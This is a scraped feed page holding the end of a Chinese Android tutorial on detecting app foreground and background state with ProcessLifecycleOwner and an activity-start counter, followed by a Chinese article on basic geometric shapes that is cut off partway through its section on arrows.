<h4 data-id="heading-3">2. 源码原理分析</h4>
<p><code>ProcessLifecycleOwner</code>的核心是利用一个名为 <code>ProcessLifecycleOwnerInitializer</code>的 <code>ContentProvider</code>自动启动。</p>
<p>关键源码：<code>ProcessLifecyclePolicy</code>通过注册 <code>ActivityLifecycleCallbacks</code>来监听所有 Activity 的生命周期，并做了两件特殊的事：</p>
<p><strong>1. 分发延迟（TIMEOUT）</strong></p>
<p>源码中定义了 <code>TIMEOUT_MS = 700ms</code>：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 源码伪代码</span>
void <span class="hljs-built_in">onActivityStopped</span>() {
    mStartedCounter--;
    if (mStartedCounter == <span class="hljs-number">0</span> &amp;&amp; mPauseSent) {
        <span class="hljs-comment">// 并不是立即发送 Stop，而是通过 Handler 延迟发送</span>
        mHandler<span class="hljs-selector-class">.postAtTime</span>(mDelayedPauseRunnable, mLastPausedTime + TIMEOUT_MS);
    }
}
</code></pre>
<p><strong>原理</strong>：当 Activity A 切换到 Activity B 时，A 会先 Stop，B 再 Start。如果没有这个延迟，App 会在切换瞬间产生一次"掉入后台再回到前台"的误判。这 700ms 确保了 Activity 跳转时的连续性。</p>
<p><strong>2. 状态挂钩</strong></p>
<p>它不仅监听 <code>onStop</code>，还监听 <code>onPause</code>。只有当最后一个 Activity 真正不可见且超过了缓冲时间，才会分发 <code>ON_STOP</code>事件。</p>
<hr/>
<h3 data-id="heading-4">二、方案二：ActivityLifecycleCallbacks 计数法（灵活自研）</h3>
<p>如果你不想引入 Lifecycle 库，或者需要在回调中立即拿到当前 Activity 实例，这是最可靠的替代方案。</p>
<h4 data-id="heading-5">1. 实现逻辑</h4>
<p>利用 <code>Application.ActivityLifecycleCallbacks</code>接口，通过一个全局计数器统计 Started 状态的 Activity 数量：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AppForegroundDetector</span> : <span class="hljs-type">Application.ActivityLifecycleCallbacks</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> startCounter = <span class="hljs-number">0</span>
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onActivityStarted</span><span class="hljs-params">(activity: <span class="hljs-type">Activity</span>)</span></span> {
        <span class="hljs-keyword">if</span> (startCounter == <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// 从 0 变为 1，说明是从后台进入前台</span>
            onAppForeground(activity)
        }
        startCounter++
    }
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onActivityStopped</span><span class="hljs-params">(activity: <span class="hljs-type">Activity</span>)</span></span> {
        startCounter--
        <span class="hljs-keyword">if</span> (startCounter == <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// 从 1 变为 0，说明所有 Activity 都不可见了</span>
            onAppBackground()
        }
    }
    
    <span class="hljs-comment">// ... 其他方法空实现</span>
}
</code></pre>
<h4 data-id="heading-6">2. 深入原理分析</h4>
<p><strong>为什么是 <code>onActivityStarted</code>而不是 <code>onActivityResumed</code>？</strong></p>
<p>这是很多开发者的误区。我们来看 Android 系统的生命周期定义：</p>
<ul>
<li><strong>Started/Stopped</strong>：控制的是 Visibility（可见性）</li>
<li><strong>Resumed/Paused</strong>：控制的是 Focus（焦点）</li>
</ul>
<p><strong>异常场景分析</strong>：</p>
<ul>
<li><strong>场景 A（系统权限弹窗）</strong> ：当 App 弹出系统权限请求对话框时，当前 Activity 会失去焦点（执行 <code>onPause</code>），但它依然可见（不执行 <code>onStop</code>）。如果用 <code>Resumed</code>计数，此时会误判为 App 进入了后台</li>
<li><strong>场景 B（透明 Activity）</strong> ：如果你启动了一个透明的 Activity，前一个 Activity 会 <code>onPause</code>但不会 <code>onStop</code></li>
</ul>
<p>✅ <strong>结论</strong>：只有使用 <code>onActivityStarted/Stopped</code>才能真实反映 App 是否在用户视线内。</p>
<hr/>
<h3 data-id="heading-7">三、两种方案的对比与选择</h3>






























<table><thead><tr><th>特性</th><th>ProcessLifecycleOwner</th><th>ActivityLifecycleCallbacks 计数法</th></tr></thead><tbody><tr><td>集成难度</td><td>极低（添加依赖即可）</td><td>中（需要手动写计数逻辑）</td></tr><tr><td>及时性</td><td>有 700ms 延迟（防抖动）</td><td>实时触发（无延迟）</td></tr><tr><td>Activity 引用</td><td>无法直接获取当前 Activity</td><td>可以在回调中直接获取 Activity 实例</td></tr><tr><td>适用场景</td><td>绝大多数业务（初始化、统计）</td><td>需要在回到前台立刻弹窗、与 UI 强耦合的场景</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-8">四、最佳实践建议</h3>
<p>在实际商业项目中，推荐<strong>组合使用</strong>：</p>
<ol>
<li>
<p><strong>全局状态监控</strong>：使用 <code>ProcessLifecycleOwner</code>负责那些与 UI 无关的逻辑，比如：</p>
<ul>
<li>上报 App 在线时长</li>
<li>清理过期缓存</li>
<li>检查静默更新</li>
</ul>
</li>
<li>
<p><strong>UI 交互逻辑</strong>：如果你需要在 App 回到前台时立刻弹出一个"欢迎回来"的 Dialog，建议使用计数器方案，因为你可以通过 <code>onActivityStarted(activity: Activity)</code>直接拿到当前的 Context 来弹出对话框。</p>
</li>
</ol>
<p>⚠️ <strong>注意坑点</strong>：</p>
<p>由于 Android 处理进程杀死的机制，当进程在后台被系统回收后重新启动，<code>startCounter</code>会重新从 0 开始计算。这通常符合我们的预期，因为此时确实是"进入了前台"，但需要注意在 <code>onCreate</code>中恢复相关状态。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【 前端三剑客-39 /Lesson65(2025-12-12)】从基础几何图形到方向符号的演进与应用📐➡️🪜➡️🥧➡️⭕➡️🛞➡️🧭]]></title>    <link>https://juejin.cn/post/7595142651728248851</link>    <guid>https://juejin.cn/post/7595142651728248851</guid>    <pubDate>2026-01-15T10:22:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595142651728248851" data-draft-id="7595401278465851433" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【 前端三剑客-39 /Lesson65(2025-12-12)】从基础几何图形到方向符号的演进与应用📐➡️🪜➡️🥧➡️⭕➡️🛞➡️🧭"/> <meta itemprop="keywords" content="前端,CSS,HTML"/> <meta itemprop="datePublished" content="2026-01-15T10:22:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Jing_Rainbow"/> <meta itemprop="url" content="https://juejin.cn/user/1285809519198256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【 前端三剑客-39 /Lesson65(2025-12-12)】从基础几何图形到方向符号的演进与应用📐➡️🪜➡️🥧➡️⭕➡️🛞➡️🧭
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1285809519198256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Jing_Rainbow
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T10:22:43.000Z" title="Thu Jan 15 2026 10:22:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>📐➡️🪜➡️🥧➡️⭕➡️🛞➡️🧭在数学、工程、设计乃至日常生活中，几何图形不仅是抽象思维的载体，更是人类理解空间、构建结构、传递信息的重要工具。从最简单的三角形开始，经过梯形、扇形、圆形、椭圆，最终演化为具有方向意义的箭头，这一序列不仅体现了图形复杂度的递增，也反映了功能从静态描述向动态指示的转变。本文将深入探讨这些图形的定义、性质、应用场景及其相互之间的联系，力求全面而详尽。</p>
<hr/>
<h2 data-id="heading-0">📐 三角形（Triangle）</h2>
<p>三角形是由三条线段首尾相连所围成的平面图形，是最基本的多边形之一。其内角和恒为180°，这是欧几里得几何中的核心定理之一。</p>
<h3 data-id="heading-1">分类方式</h3>
<ul>
<li>
<p><strong>按边长</strong>：</p>
<ul>
<li>等边三角形（三边相等，三个角均为60°）</li>
<li>等腰三角形（两边相等，底角相等）</li>
<li>不等边三角形（三边均不相等）</li>
</ul>
</li>
<li>
<p><strong>按角度</strong>：</p>
<ul>
<li>锐角三角形（三个角均小于90°）</li>
<li>直角三角形（一个角为90°，满足勾股定理 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mn>2</mn></msup><mo>+</mo><msup><mi>b</mi><mn>2</mn></msup><mo>=</mo><msup><mi>c</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">a^2 + b^2 = c^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"/><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8141em;"/><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8141em;"/><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span>）</li>
<li>钝角三角形（一个角大于90°）</li>
</ul>
</li>
</ul>
<h3 data-id="heading-2">重要性质</h3>
<ul>
<li>
<p><strong>稳定性</strong>：三角形是唯一具有“刚性”的多边形——在不改变边长的情况下无法变形，因此广泛应用于桥梁、塔架、桁架等工程结构中。</p>
</li>
<li>
<p><strong>重心、垂心、内心、外心</strong>：三角形拥有多个特殊点，分别对应质量中心、高线交点、内切圆圆心、外接圆圆心。</p>
</li>
<li>
<p><strong>面积公式</strong>：</p>
<ul>
<li>基础公式：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>=</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo>×</mo><mtext>底</mtext><mo>×</mo><mtext>高</mtext></mrow><annotation encoding="application/x-tex">A = \frac{1}{2} \times 底 \times 高</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"/><span class="mord cjk_fallback">底</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord cjk_fallback">高</span></span></span></span></span></li>
<li/>
</ul>
</li>
</ul>
<h3 data-id="heading-3">应用领域</h3>
<ul>
<li>建筑学（屋顶结构、桁架）</li>
<li>计算机图形学（3D建模的基本单元）</li>
<li>导航与测量（三角测量法）</li>
</ul>
<hr/>
<h2 data-id="heading-4">🪜 梯形（Trapezoid / Trapezium）</h2>
<p>梯形是至少有一组对边平行的四边形。在美式英语中称为 <em>trapezoid</em>，而在英式英语中 <em>trapezium</em> 指无平行边的四边形，需注意术语差异。</p>
<h3 data-id="heading-5">定义与分类</h3>
<ul>
<li><strong>普通梯形</strong>：仅一组对边平行（称为“底”），另两边为“腰”。</li>
<li><strong>等腰梯形</strong>：非平行边（腰）长度相等，底角相等，具有对称轴。</li>
<li><strong>直角梯形</strong>：其中一个腰垂直于底边，形成两个直角。</li>
</ul>
<h3 data-id="heading-6">性质</h3>
<ul>
<li>中位线（连接两腰中点的线段）长度等于两底之和的一半。</li>
<li>面积公式：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>=</mo><mfrac><mrow><mo stretchy="false">(</mo><mtext>上底</mtext><mo>+</mo><mtext>下底</mtext><mo stretchy="false">)</mo><mo>×</mo><mtext>高</mtext></mrow><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">A = \frac{(上底 + 下底) \times 高}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.355em;vertical-align:-0.345em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord cjk_fallback mtight">上底</span><span class="mbin mtight">+</span><span class="mord cjk_fallback mtight">下底</span><span class="mclose mtight">)</span><span class="mbin mtight">×</span><span class="mord cjk_fallback mtight">高</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></li>
</ul>
<h3 data-id="heading-7">应用</h3>
<ul>
<li>土木工程（堤坝横截面、渠道设计）</li>
<li>机械设计（滑块导轨、楔形结构）</li>
<li>艺术构图（营造透视感或稳定感）</li>
</ul>
<p>梯形可视为三角形的“扩展”——若将三角形顶部截去一部分，即得梯形。这种“截断”操作在几何变换中十分常见。</p>
<hr/>
<h2 data-id="heading-8">🥧 扇形（Sector of a Circle）</h2>
<p>扇形是由圆心角及其所对的弧与两条半径围成的图形，形如披萨切片，故常用🍕表示，但此处更强调其几何属性，故用🥧（派）象征。</p>
<h3 data-id="heading-9">构成要素</h3>
<ul>
<li/>
<li>圆心角 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>θ</mi></mrow><annotation encoding="application/x-tex">\theta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span></span></span></span></span>（可用度数或弧度表示）</li>
<li/>
<li/>
</ul>
<h3 data-id="heading-10">特殊情形</h3>
<ul>
<li/>
<li/>
<li/>
</ul>
<h3 data-id="heading-11">应用场景</h3>
<ul>
<li>仪表盘设计（速度表、电量显示）</li>
<li>统计图表（饼图 Pie Chart 的基本单元）</li>
<li>光学（激光束发散角、照明覆盖区域）</li>
<li>机械（齿轮齿形、凸轮轮廓）</li>
</ul>
<p>扇形是从圆形“切割”而来，体现了从整体到局部的分析思维。</p>
<hr/>
<h2 data-id="heading-12">⭕ 圆形（Circle）</h2>
<p>圆形是平面上到定点（圆心）距离等于定长（半径）的所有点的集合，具有完美的对称性。</p>
<h3 data-id="heading-13">核心性质</h3>
<ul>
<li>周长：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo>=</mo><mn>2</mn><mi>π</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">C = 2\pi r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span></span></li>
<li>面积：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>=</mo><mi>π</mi><msup><mi>r</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">A = \pi r^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8141em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></li>
<li>任意直径将圆分为两个全等半圆</li>
<li>圆周角定理：同弧所对的圆周角相等，且为圆心角的一半</li>
</ul>
<h3 data-id="heading-14">对称性</h3>
<ul>
<li>无限条对称轴（每条直径都是对称轴）</li>
<li>中心对称图形</li>
</ul>
<h3 data-id="heading-15">应用</h3>
<ul>
<li>车轮（滚动摩擦最小）</li>
<li>齿轮传动（均匀受力）</li>
<li>天文轨道（理想化模型）</li>
<li>信号传播（波前呈圆形扩散）</li>
</ul>
<p>圆形是所有封闭曲线中，在给定周长下面积最大的图形（等周定理），体现了自然界的效率最优。</p>
<hr/>
<h2 data-id="heading-16">🛞 椭圆（Ellipse）</h2>
<p>椭圆是平面上到两个定点（焦点）的距离之和为常数的点的轨迹。当两焦点重合时，椭圆退化为圆形。</p>
<h3 data-id="heading-17">数学表达</h3>
<ul>
<li/>
<li/>
<li>离心率：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>=</mo><mfrac><mi>c</mi><mi>a</mi></mfrac></mrow><annotation encoding="application/x-tex">e = \frac{c}{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.0404em;vertical-align:-0.345em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6954em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">c</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span>，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>e</mi><mo>&lt;</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0 &lt; e &lt; 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"/><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>；<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">e=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span> 时为圆</li>
</ul>
<h3 data-id="heading-18">几何性质</h3>
<ul>
<li>两条对称轴（长轴与短轴）</li>
<li>反射性质：从一焦点发出的光线经椭圆反射后必过另一焦点（用于声学聚焦、医疗碎石）</li>
</ul>
<h3 data-id="heading-19">实际应用</h3>
<ul>
<li>行星轨道（开普勒第一定律）</li>
<li>建筑穹顶（如美国国会大厦）</li>
<li>光学镜面（椭圆反射镜）</li>
<li>工程制图（斜截圆柱的截面为椭圆）</li>
</ul>
<p>椭圆可视为圆形在某一方向上的“拉伸”或“压缩”，是仿射变换下的不变图形。</p>
<hr/>
<h2 data-id="heading-20">🧭 箭头（Arrow）</h2>
<p>箭头并非传统几何图形，而是一种<strong>符号性图形</strong>，用于表示方向、流程、趋势或指示。</p>
<h3 data-id="heading-21">结构成分</h3>
<ul>
<li><strong>杆部（Shaft）</strong> ：通常为直线或带状，表示路径或主轴。</li>
<li><strong>箭头头（Head）</strong> ：多为三角形或锥形，强调方向终点。</li>
<li>有时包含<strong>尾羽</strong>（如弓箭样式），增强视觉识别。</li>
</ul>
<h3 data-id="heading-22">类型与用途</h3>
<ul>
<li><strong>单向箭头</strong>：→ 表示单一方向（如流程图、路标）</li>
<li><strong>双向箭头</strong>：↔ 表示往返或对等关系</li>
<li><strong>弯曲箭头</strong>：↷ 表示旋转、循环或非线性过程</li>
